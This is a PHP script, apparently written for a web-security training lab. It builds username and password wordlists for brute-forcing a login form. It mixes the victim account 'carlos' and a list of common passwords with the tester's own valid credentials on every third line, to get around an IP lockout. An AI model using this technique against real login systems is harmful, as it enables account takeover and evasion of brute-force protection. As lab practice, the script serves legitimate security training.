<?php

$victim = 'carlos';
$myu = 'wiener';
$myp = 'peter';

file_put_contents('usernames.txt', "wiener\n");
file_put_contents('passwords.txt', "peter\n");

for ($i = 1; $i <= 100; $i++) {
    $data = $i % 3 === 0 ? $myu : $victim;

    file_put_contents('usernames.txt', $data . "\n", FILE_APPEND);
}

$pws = "123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow";

foreach (explode("\n", $pws) as $i => $pw) {
    $data = ($i + 1) % 3 === 0 ? $myp : $pw;

    file_put_contents('passwords.txt', $data . "\n", FILE_APPEND);
}